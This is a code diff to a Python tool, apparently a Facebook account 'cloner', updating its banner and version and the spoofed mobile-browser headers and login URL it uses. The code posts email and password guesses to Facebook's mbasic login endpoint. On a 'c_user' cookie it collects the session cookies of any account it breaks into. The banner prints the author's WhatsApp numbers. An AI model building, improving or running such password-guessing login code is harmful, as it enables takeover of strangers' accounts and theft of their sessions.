@@ -148,17 +148,18 @@ def menu_apikey():
   os.system(" clear")                          
   print("""\x1b[1;97m
 
-███    ███ ██████           ██ ██ ██████   ██████  ███    ███ 
-████  ████ ██   ██          ██ ██ ██   ██ ██    ██ ████  ████ 
-██ ████ ██ ██████           ██ ██ ██████  ██    ██ ██ ████ ██ 
-██  ██  ██ ██   ██     ██   ██ ██ ██   ██ ██    ██ ██  ██  ██ 
-██      ██ ██   ██      █████  ██ ██████   ██████  ██      ██                                                                                                                           
+
+███    ███ ██████           ██ ██ ██████   ██████  ███    ██ 
+████  ████ ██   ██          ██ ██ ██   ██ ██    ██ ████   ██ 
+██ ████ ██ ██████           ██ ██ ██████  ██    ██ ██ ██  ██ 
+██  ██  ██ ██   ██     ██   ██ ██ ██   ██ ██    ██ ██  ██ ██ 
+██      ██ ██   ██      █████  ██ ██████   ██████  ██   ████                                                                                                                                                                                                                                                  
 
     ┌───────────────────────────────────────┐
     │ [✓] AUTHOR   : MRX JIBON            
     │ [✓] LIKE    : PYTHON                  
     │ [✓] WHATSAPP : +8801846738727         
-    │ [✓] VERSION  : 1.0                  
+    │ [✓] VERSION  : 1.1                  
     │ [✓] TOOLS    : \033[1;32m RANDOM GAME ID CLONER  \033[1;37m
     └───────────────────────────────────────┘""")
   print(f"\t \033[1;32m BIG FAN OF ROBERT DOWNER JR ™ \033[1;37m ")
@@ -213,7 +214,7 @@ logo=(f"""\x1b[1;97m
    │ [✓] AUTHOR   :  MRX JIBON           
    │ [✓] LIKE     :  PYTHON                
    │ [✓] WHATSAPP : +8801865544636         
-   │ [✓] VERSION  : 1.0                   
+   │ [✓] VERSION  : 1.1                   
    │ [✓] TOOLS    : \033[1;32m GAME ID CLONER  \033[1;37m
    └───────────────────────────────────────┘""")
 def cek_apk(session,coki):
@@ -404,27 +405,28 @@ def a(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'mbasic.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
             "method": 'GET',
             "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=1',
-            'cache-control': 'no-cache, no-store, must-revalidate',
-            "referer": 'https://t.facebook.com/',
-            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
-            "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": "Windows",
-            "sec-fetch-dest": 'document',
-            "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'same-origin',
-            "sec-fetch-user": '?0',
-            "pragma": 'no-cache',
-            "priority": 'u=0',
-            'cross-origin-resource-policy': 'cross-origin',
-            "upgrade-insecure-requests": '1',
-            "user-agent": pro}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dpr': '2',
+            'referer': 'https://mbasic.facebook.com/',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"TECNO BF7"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
